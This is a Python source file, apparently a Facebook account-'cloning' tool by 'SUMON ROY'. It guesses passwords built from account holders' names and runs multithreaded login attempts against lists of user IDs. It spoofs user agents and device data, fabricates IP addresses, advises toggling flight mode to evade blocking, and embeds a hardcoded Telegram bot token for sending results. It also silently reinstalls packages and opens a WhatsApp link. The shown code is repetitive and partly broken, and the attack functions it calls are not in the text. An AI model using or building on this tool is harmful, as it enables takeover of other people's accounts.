#__________________| IMPORT |__________________#
import os,sys,re,time,uuid,json,string,random,base64,platform
from concurrent.futures import ThreadPoolExecutor
os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
try:
    import requests
except ImportError:
    os.system("pip install requests")
try:
    import urllib3
except ImportError:
    os.system("pip install urllib3")
try:
    import bs4
except ImportError:
    os.system("pip install bs4")
try:
    import mechanize
except ImportError:
    os.system("pip install mechanize")
try:
    import rich
except ImportError:
    os.system("pip install rich")
import urllib3
import requests,certifi
from requests.exceptions import ConnectionError
from requests import api
from requests import models
from requests import sessions  
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from datetime import datetime as dt
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
#print("WAIT INSTALLING MODULES")
#os.system("pip install bs4")
#os.system("pip install requests")
#os.system("pip install rich")
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python dev.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from requests.exceptions import ConnectionError as net_error
import os
import sys
import re
import time
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor as tpe
from requests.exceptions import ConnectionError as ce
try:
    import urllib3
except ImportError:
    os.system("pip install urllib3")
import urllib3     
os.system('clear')
try:
 import requests
except:os.system("pip uninstall requests -y;pip install requests")
print('\033[1;91m[\033[1;97m✓\033[1;91m] \033[1;92mLOADING TOOLS BE PATIENT. . . .')
#os.system('espeak -a 300 " Waiting for Update,"')

time.sleep(2)
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print('\033[1;91m[\033[1;92m✓\033[1;91m] \033[1;92mYOU ARE 64BIT USER')
elif bit == '32bit':
 print('\033[1;91m[\033[1;92m✓\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
 os.system('pip install requests beautifulsoup4')

def generate_random_ip():
    # Indian public IP address ranges (some common ranges)
    first_octet = random.choice([152])
    second_octet = random.randint(56, 59)
    third_octet = random.randint(130, 199)
    fourth_octet = random.randint(1, 254)  # Avoid 0 and 255 for valid hosts
    return f"{first_octet}.{second_octet}.{third_octet}.{fourth_octet}"

def check_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def generate_unlimited_ips():
    ips = set()
    while True:  # Infinite loop to generate unlimited IPs
        ip = generate_random_ip()
        if check_ip(ip):
            if ip not in ips:  # Avoid duplicates
                ips.add(ip)
                return f"{ip}"
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
os.system('')
today = '\033[1;32m'+str(hari)+'\033[1;97m-\033[1;32m'+str(bulan)+'\033[1;97m-\033[1;32m'+str(tahun)
#----------get_current_city-------#
def get_current_location():
    try:
        response = requests.get('https://ipinfo.io/json')
        response.raise_for_status()  # Raise an HTTPError for bad responses
        data = response.json()
        city = data.get('city', 'Unknown')
        country = data.get('country', 'Unknown')
        return city, country
    except requests.RequestException as e:
        print("Error fetching current location:", e)
        return None, None
# Example usage
current_city, current_country = get_current_location()
#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'it_IT'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Telenor'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Telenor"
                        sim_id+=fbcr
        else:
                fbcr = 'Telenor'
                sim_id+=fbcr
except:
        fbcr = "Telenor"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

### ----- [ UserAgentByAlin ] ----- ###
def Ugen():
	rr,rc = random.randint,random.choice
	ver_a, ver_c = rc([f"{str(rr(4,9))}.0.0",f"{str(rr(0,9))}.1.1",f"{str(rr(0,9))}.5.5",f"{str(rr(0,9))}.5.1",f"{str(rr(0,17))}",f"{str(rr(0,9))}.0"]), rc([f"{str(rr(109,199))}.0.{str(rr(4000,10000))}.{str(rr(120,299))}",f"{str(rr(71,180))}.0.{str(rr(1000,5000))}.{str(rr(73,300))}",f"{str(rr(110,120))}.0.0.0",f"{str(rr(100,190))}.{str(rr(0,9))}.{str(rr(3200,9200))}.{str(rr(120,440))}"])
	ver_b, ver_d = rc(["fr-fr"," fr-FR","en-us","en-gb","id-id","de-de","ru-ru","en-sg","my-sg","fr-fr","fa-ir","ja-jp","pt-br","cs-cz","zh-hk","zh-cn","vi-vn","en-ph","en-in","tr-tr","es-es","it-it","zh-tw"]), rc([f"SP1A.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"TP1A.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}", f"QKQ1.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"OPM1.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"RP1A.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"PKQ1.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"QQ1A.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}","QP1A.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9)}","SKQ1",f"SP1A.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"RKQ1.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"RQ1A.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"QKQ1.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}",f"TKQ1.{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}"])
	ver_i = random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X676B','Infinix X687','Infinix X609','Infinix X697','Infinix X680D','Infinix X507','Infinix X605','Infinix X668','Infinix X6815B','Infinix X624','Infinix X655F','Infinix X689C','Infinix X608','Infinix X698','Infinix X682C','Infinix X688C','Infinix X689B','Infinix X689','Infinix X689D','Infinix X662','Infinix X662B','Infinix X675','Infinix X6812B','Infinix X6812','Infinix X6817B','Infinix X6817','Infinix X6816C','Infinix X6816','Infinix X6816D','Infinix X668C','Infinix X665B','Infinix X665E','Infinix X510','Infinix X559C','Infinix X559F','Infinix X559','Infinix X606','Infinix X606C','Infinix X606D','Infinix X623','Infinix X624B','Infinix X625C','Infinix X625D','Infinix X625B','Infinix X650D','Infinix X650B','Infinix X650','Infinix X650C','Infinix X655C','Infinix X655D','Infinix X680B','Infinix X573','Infinix X573B','Infinix X622','Infinix X693','Infinix X695C','Infinix X695D','Infinix X695','Infinix X663B','Infinix X663','Infinix X670','Infinix X671','Infinix X671B','Infinix X672','Infinix X6819','Infinix X572','Infinix X572-LTE','Infinix X571','Infinix X604','Infinix X610B','Infinix X690','Infinix X690B','Infinix X656','Infinix X692','Infinix X683','Infinix X450','Infinix X5010','Infinix X501','Infinix X401','Infinix X626','Infinix X626B','Infinix X652','Infinix X652A','Infinix X652B','Infinix X652C','Infinix X660B','Infinix X660C','Infinix X660','Infinix X5515','Infinix X5515F','Infinix X5515I','Infinix X609B','Infinix X5514D','Infinix X5516B','Infinix X5516C','Infinix X627','Infinix X680','Infinix X653','Infinix X653C','Infinix X657','Infinix X657B','Infinix X657C','Infinix X6511B','Infinix X6511E','Infinix X6511','Infinix X6512','Infinix X6823C','Infinix X612B','Infinix X612','Infinix X503','Infinix X511','Infinix X352','Infinix X351','Infinix X530','Infinix X676C','Infinix X6821','Infinix X6823','Infinix X6827','Infinix X509','Infinix X603','Infinix X6815','Infinix X620B','Infinix X620','Infinix X687B','Infinix X6811B','Infinix X6810','Infinix X6811',f"Infinix X{str(random.randint(550,699))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(5511,5516))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(6711,6899))}{random.choice(['B','C','D','E','F',''])}"])
	ver_s = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750','GT-I9300','TECNO CD8','itel L6005','itel L6501','TECNO KE7','TECNO IN2','TECNO CD6j','TECNO BD2p','TECNO KD7h','TECNO LA7','itel W6004','MobiGo2','TECNO LC6','TECNO KB7j','itel S661W','TB300FU','S96GT','ZTE A2023G','OPPO A79kt','TECNO CI7n','MP1718','V2154A','SAMSUNG SM-M346B','itel S663L','CHL-AL00','vivo Z3x','CHL-AL00','ivvi P60(i8)'])
	UG1 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_b}; RMX3231 Build/{ver_d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} YaBrowser/21.8.1.127.00 SA/3 TA/7.1 Mobile Safari/537.36"
	UG2 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_b}; RMX3231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} YaBrowser/21.8.1.127.00 SA/3 TA/7.1 Mobile Safari/537.36"
	UG3 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_b}; RMX3231 Build/{ver_d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
	UG4 = f"Mozilla/5.0 (Linux; Android {ver_a}; RMX3231 Build/{ver_d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
	UG5 = f"Mozilla/5.0 (Linux; Android 12; realme Monet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
	UG6 = f"Mozilla/5.0 (Linux; Android 12; realme Monet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
	UG7 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.52 Mobile/15E148 Safari/604.1"
	UG8 = f"Mozilla/15.0 (wwd; CPU OS 15_0 like Mac OS ) AppleWebKit/15 (KHTML, like Gecko) CriOS/15 Mobile/15 Safari/15"
	UG9 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/123 Mobile/15E148 Version/15.0"
	UG10 = f"Mozilla/7.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/705.1.15 (KHTML, like Gecko) CriOS/222.0.6261.51 Mobile/15E148 Safari/704.1"
	UG11 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21D61 AliApp(DingTalk/7.5.5) com.laiwang.DingTalk/34999137 Channel/201200 language/zh-Hans-CN UT4Aplus/0.0.6 WK"
	UG12 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/16.1 Safari/605.1.15 (AirWatch Browser v24.02)"
	UG13 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21D61 AliApp(DingTalk/7.5.5) com.laiwang.DingTalk/34999137 Channel/201200 language/en-CN UT4Aplus/0.0.6 WK"
	UG14 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_b}; {ver_i} Build/{ver_d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG15 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_i} Build/{ver_d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG16 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_i}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG17 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_b}; {ver_s} Build/{ver_d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG18 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_s} Build/{ver_d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG19 = f"Mozilla/5.0 (Linux; Android {ver_a}; {ver_s}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG20 = f"mozilla/5.0 (linux; Android {ver_a}; Meizu C3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG21 = f"Mozilla/5.0 (linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver_c} Mobile Safari/537.36"
	UG22 = f"mozilla/5.0 (linux; Android {ver_a}; {ver_b}; Meizu C3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG23 = f"mozilla/5.0 (linux; Android {ver_a}; {ver_b}; Meizu C3 Build/{ver_d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	UG24 = f"Mozilla/5.0 (Windows Win X64; 10.0 NT) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver_c} Mobile Safari/537.36"
	UG25 = f"mozilla/5.0 (linux; Android {ver_a}; ZTE BLADE 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_c} Mobile Safari/537.36"
	AdelSiImut = rc([UG1,UG2,UG3,UG4,UG5,UG6,UG7,UG8,UG9,UG10,UG11,UG12,UG13,UG14,UG15,UG16,UG17,UG18,UG19,UG20,UG21,UG22,UG23,UG24,UG25])
	return AdelSiImut

token = ('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')
ID = ('1778046662')
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#--------[ LISTS && LOOPS ]---------#
loop = 0
oks = []
cps = []
xnxx = []
pwx = []
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m";white = "\033[1;37m";green = "\033[1;32m";red = "\033[1;31m";yellow = "\033[1;33m";blue = "\033[1;34m";pink = "\033[1;35m"
os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO");
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

#__________________| LOGO |__________________#
logo=(f"""
{faltu} {black}"If you get tired, learn to rest, not to quit".... {pvt}
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMON ROY
\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logins
\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;36mFile × \033[1;36mRandom 
\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;32m0.0.1
\033[1;32m[\033[1;31m✓\033[1;32m] DATE       : \033[1;32m{today}
\033[1;32m[\033[1;31m✓\033[1;32m] COUNTRY    : \033[1;32m{current_country}
\033[1;32m[\033[1;31m✓\033[1;32m] YOUR CITY  : \033[1;32m{current_city}
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________| MAIN |__________________#
def clear():
	os.system('clear')
	print(logo)
def check_lock(cid):
    req = str(requests.get(f'https://graph.facebook.com/{cid}/picture?type=normal').text)
    if 'Photoshop' in req:
        return 'live'
    else:
        return 'lock'
#--------[ DIVIDER DEF ]---------#
def divider():
    print(f"{white}{45*'-'}")

def wow(text):
    string = f"{white}({green}{text}{white})"
    return string

def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
#__________________| MAIN |__________________#
def menu():
        try:
              #  approval()
                        clear()
                        print(f'{G}[{A}1{G}]{G} FILE CLONING \n{G}[{A}2{G}]{G} RANDOM CLONING\n{G}[{A}3{G}]{G} CONTACT TOOL OWNER\n{G}[{A}0{G}]{G} EXIT TOOL')
                        linex()
                        xd=input(f'{G}[{A}?{G}]{A} CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/BITHIKA.txt ');linex()
                                file = input(f'{G}[{A}?{G}]{G} FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]\n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]');linex()
                                mthd=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                clear()
                                plist = []
                                print(f'                  PASSWORD SYSTEM');linex();print(f'{G}[{A}1{G}]{G} AUTO PASSWORD CLONE\n{G}[{A}2{G}]{G} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('First Last')
                                        plist.append('first786')
                                        plist.append('firstlast123')
                                        plist.append('firstlast786')
                                        plist.append('firstlast@123')
                                        plist.append('first@123')
                                        plist.append('firstlast@12345')
                                        plist.append('firstlast@#')
                                        plist.append('first123@#')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT : '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : firstlast{G}/{G}first@@{G}/{G}first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD NO {i+1} :{A} '))
                                clear()
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] CP ID SHOW (y/n) ')
                                linex()
                                cx=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNT :{A} '+total_ids+f' {G}<{A}-{G}> METHOD :{A} M{mthd}')
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(api4,ids,names,passlist)
                                                    
                                print('\033[1;37m')
